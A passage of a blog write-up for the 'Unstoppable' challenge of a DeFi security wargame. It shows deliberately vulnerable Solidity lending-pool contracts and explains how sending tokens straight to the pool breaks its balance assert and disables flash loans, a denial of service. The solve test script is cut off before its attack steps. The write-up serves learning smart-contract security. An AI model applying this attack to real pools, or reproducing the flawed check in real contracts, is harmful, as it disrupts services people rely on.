url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACfElEQVQoz1WRSWsTYQCGv8w+005nsqeT2b6ZySTTrG2TaZqlaZsYTWqrpjZWbLRWjC2lYD2IUhBBBC3ighcv3jx40YOoaEH0opcKriCCInoQPPoHRNJ6EZ7r8x7eB1w9MdnMFziX1c1HWKfFOi3OHfUEki5f3BtIuXxxp7eDyxd3+5O8Oxqxp45cuF1tn9cq80ANhr1OAyVUhFAQQnXgMk5rvVLaL/TLWlaCQ71iOiCmg4qt6FlBTsczE42Vi3tOXrb2nwKOLQ2jIE5rGAUJWsMpiFMQJWE3HxE7zrCiD8swq4XyijYMQ/l4dsquzRulgwClNaynDyF0gEsoEwKoBHAFoDJwBAESBKgIHEEE76yTjI5TmsMhYBTEaI3hwqAvt6/ZXqvtXhzIN8YbS7XJdnnqeLm+UKnOFkan8yONav1QLFnBKAhAL0Wpdn8FoxSUhHR3CMiJ6sTMcmm8FctMZnfODRWauWprdMfcQKauR4pBOaOHi7wnxrChMLTrteWvb38ocAQgAstbwGsUosVpM1UXQ6VAou4J5q1kPTVY080cQigAFRFEBEDwCZnPD59u3n//6tmf5fYthFRJxgC8kvNYVR8c4/w2b1S94ojfHJNCJW8gRjA6Tms4raOk2uVKtI6tr196cvPa67OrdwLCEMAlsHj4zOmVK9MTq4I26rZ2CeqYzyyrZplzR2jWQEnYuYeCBKP7xWIydaBUmLcHmy73QBedBL+ef/j98vvHe++WWudEs8x5+mk2QrMmwWg4/c/cZjsh25WWe2YTzrWs6wbYvLvx7fGbnxtfHlx/FNZKABMxSkVJFaX+M7Gt8gxnRqWjM8aLhfCnvcrGX6mKfbw4qpSKAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"unstoppable-contract\"\n        title=\"unstoppable-contract\"\n        src=\"/static/576c503a2b54e25e3ee5f0c99ac34cb6/37523/c1.png\"\n        srcset=\"/static/576c503a2b54e25e3ee5f0c99ac34cb6/e9ff0/c1.png 180w,\n/static/576c503a2b54e25e3ee5f0c99ac34cb6/f21e7/c1.png 360w,\n/static/576c503a2b54e25e3ee5f0c99ac34cb6/37523/c1.png 720w,\n/static/576c503a2b54e25e3ee5f0c99ac34cb6/e996b/c1.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #1 — Unstoppable</p>\n</blockquote>\n<p>There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.\nIf only there was a way to attack and stop the pool from offering flash loans …\nYou start with 100 DVT tokens in balance.</p>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>UnstoppableLender.sol</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">DamnValuableToken</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DamnValuableToken\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"DVT\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IReceiver</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">UnstoppableLender</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">{</span>\n\n    IERC20 <span class=\"token keyword\">public</span> immutable damnValuableToken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> poolBalance<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>tokenAddress <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Token address cannot be zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        damnValuableToken <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">depositTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Must deposit at least one token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Transfer token from sender. Sender must have first approved them.</span>\n        damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        poolBalance <span class=\"token operator\">=</span> poolBalance <span class=\"token operator\">+</span> amount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>borrowAmount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Must borrow at least one token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> balanceBefore <span class=\"token operator\">=</span> damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceBefore <span class=\"token operator\">>=</span> borrowAmount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough tokens in pool\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>poolBalance <span class=\"token operator\">==</span> balanceBefore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token function\">IReceiver</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>damnValuableToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token builtin\">uint256</span> balanceAfter <span class=\"token operator\">=</span> damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceAfter <span class=\"token operator\">>=</span> balanceBefore<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Flash loan hasn't been paid back\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"quick-security-check\" style=\"position:relative;\"><a href=\"#quick-security-check\" aria-label=\"quick security check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Quick Security Check</h3>\n<p>By using the ReentrancyGuardcontract, <code class=\"language-text\">ReentrancyGuard’s</code> nonReentrant Modifier is applied to the internal functions of the main contract to prevent reentrancy calls from occurring.</p>\n<h3 id=\"state-variables\" style=\"position:relative;\"><a href=\"#state-variables\" aria-label=\"state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variables</h3>\n<p>Two State Variables are being used. The damnValuableToken variable is assigned as an IERC20 token. The <code class=\"language-text\">poolBalanc</code> evariable is used as the flashLoan pool within the contract.</p>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<ul>\n<li>\n<p>You can see that the constructor sets token address as a factor of address type.</p>\n</li>\n<li>\n<p>Let’s check the function. <code class=\"language-text\">depositTokens(uint256 amount) external nonReentrant</code></p>\n</li>\n<li>\n<p>When proceeding to this contract based on passing the condition that the amount value must be greater than 0, by default, the amount must be transferred with a positive value.</p>\n</li>\n<li>\n<p>Call the token contract function <code class=\"language-text\">transferFrom</code> and send to this contract in balance as much as the value of the variable</p>\n</li>\n<li>\n<p>Finally, add the value of the amount sent to the <code class=\"language-text\">poolBalance</code> value.</p>\n</li>\n</ul>\n<p>Let’s check the function. <code class=\"language-text\">flashLoan(uint256 borrowAmount) external nonReentrant</code></p>\n<ul>\n<li>Depending on the value of the <code class=\"language-text\">borrowAmount</code> parameter, you can take out a loan from the balance deposited in the contract pool.</li>\n<li>You can see various Error Handling patterns. The <code class=\"language-text\">borrowAmount</code> value must be greater than zero, which can be borrowed from the minimum positive value of 1.you can get a loan from the balance deposited in the contract pool.</li>\n<li>BalanceBefore Local Variable is assigned the Current Contract Balance. Must be greater than or equal to the value of browAmount. The value you want to borrow must not exceed the Contract Balance value.</li>\n<li>In code <code class=\"language-text\">assert(poolBalance==balanceBefore)</code> ErrorHandling, the value of the poolBalance variable must be the same as the value of the balanceBefore variable. This condition is because the value of the poolBalance variable was updated by depositing the balance to this contract in the depositTokens function and adding the value of the poolBalance variable to the value of the amount variable.</li>\n<li>Send the value of the <code class=\"language-text\">browAmount</code> variable to <code class=\"language-text\">msg.sender</code> using the <code class=\"language-text\">transfer</code> function. (This section completes the transfer.)</li>\n<li><code class=\"language-text\">IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount)</code> Transfer the token’s address value and loan balance value to the receiver Tokens function defined in the external contract to proceed with loan repayment. After completing the loan, this Contract Current Balance compares the values of the previous Balance to complete the flashloan operation.</li>\n</ul>\n<blockquote>\n<p>ReceiverUnstoppable.sol</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../unstoppable/UnstoppableLender.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">ReceiverUnstoppable</span> <span class=\"token punctuation\">{</span>\n\n    UnstoppableLender <span class=\"token keyword\">private</span> immutable pool<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> immutable owner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> poolAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        pool <span class=\"token operator\">=</span> <span class=\"token function\">UnstoppableLender</span><span class=\"token punctuation\">(</span>poolAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Sender must be pool\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Transfer of tokens failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">executeFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Only owner can execute flash loan\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"state-variable\" style=\"position:relative;\"><a href=\"#state-variable\" aria-label=\"state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">UnstoppableLender private immutable pool;</code></p>\n<ul>\n<li>Assign a distribution address for the Unstoppable deployed contract.</li>\n</ul>\n<p><code class=\"language-text\">address private immutable owner;</code></p>\n<ul>\n<li>Assigns the address of msg.sender in the current contract.</li>\n</ul>\n<h3 id=\"functions-1\" style=\"position:relative;\"><a href=\"#functions-1\" aria-label=\"functions 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">constructor(address poolAddress)</code></p>\n<ul>\n<li>Set up the distribution address of the UnstoppableLender contract and the current contract msg.sender address value in each state variable.</li>\n</ul>\n<p><code class=\"language-text\">function receiveTokens(address tokenAddress, uint256 amount) external</code></p>\n<ul>\n<li>We will proceed with the repayment of the loan while working on the flash loan.</li>\n<li>Compare the msg.sender address value with the contract address value because UnstoppableLender contract only calls this function.</li>\n<li>Finalize the loan repayment based on the transfer function.</li>\n</ul>\n<p><code class=\"language-text\">function executeFlashLoan(uint256 amount) external</code></p>\n<ul>\n<li>UnstoppableLendercotnract internal flashLoan functions can be call.</li>\n<li>To make a call, the address value of the msg.sender address, that is, the address value of the call contract, must be the same as the address value of msg.senderwhen deploying the RecoverUnstoppable contract.</li>\n<li>Only the owner should be able to run flashloan for this part.</li>\n</ul>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>The final attack objective of the target contract should disable the flash loan System, causing DOS. As a result of the contract code auditing, you can see that it is a simple flash Loan pattern.\n<code class=\"language-text\">flashLoan(uint256 borrowAmount) external nonReentrant</code> To disable a function, you must carefully analyze its dependencies, such as variables and external contracts.</p>\n<p>This function uses a number of state variables to perform an Error Handling test. You can see the state variable <code class=\"language-text\">PoolBalance</code>. Verify that the value of this variable is the same for the balance before the loan, which is the balance Before variable. If the condition fails because of the use of <code class=\"language-text\">assert(poolBalance==balanceBefore);</code> assert handle, it causes an error after exhausting gas.</p>\n<p><code class=\"language-text\">PoolBalance</code> StateVariable is used to track and trigger the balance by adding the balance to the GlobalVariable value <code class=\"language-text\">msg.sender</code> balance during the deposition to this flashLoan pool contract via the <code class=\"language-text\">depositionTokens</code> function.</p>\n<p>You can see that there is a problem with the error handling method.In the <code class=\"language-text\">depositTokens</code> function, the balance of the <code class=\"language-text\">UnstoppableLender</code> Contract is added. The balance value is stored equally in the <code class=\"language-text\">poolBalance</code> variable and is used in the flashLoan function to check the balance condition.</p>\n<h3 id=\"what-happens-if-you-force-the-transfer-function-to-add-the-balance-without-calling-the-deposittoken-function\" style=\"position:relative;\"><a href=\"#what-happens-if-you-force-the-transfer-function-to-add-the-balance-without-calling-the-deposittoken-function\" aria-label=\"what happens if you force the transfer function to add the balance without calling the deposittoken function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>What happens if you force the transfer function to add the balance without calling the depositToken function?</h3>\n<p>By bypassing the logic configured in the contract, the balance value of the contract was added abnormally, so <code class=\"language-text\">assert(poolBlance == balanceBefore);</code> error handling was performed on flashLoan, which could cause a contract error to cause DOS.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solve</h2>\n<p>Call the transfer function without adding a contract balance through the <code class=\"language-text\">depoitToken</code> function to add a contract balance, and finally call the flashLoan function. An exception occurred successfully through testing, and DOS attack completed successfully.</p>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> expect <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'chai'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[Challenge] Unstoppable'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">,</span> someUser<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">TOKENS_IN_POOL</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1000000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">INITIAL_ATTACKER_TOKEN_BALANCE</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'100'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">[</span>deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">,</span> someUser<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token 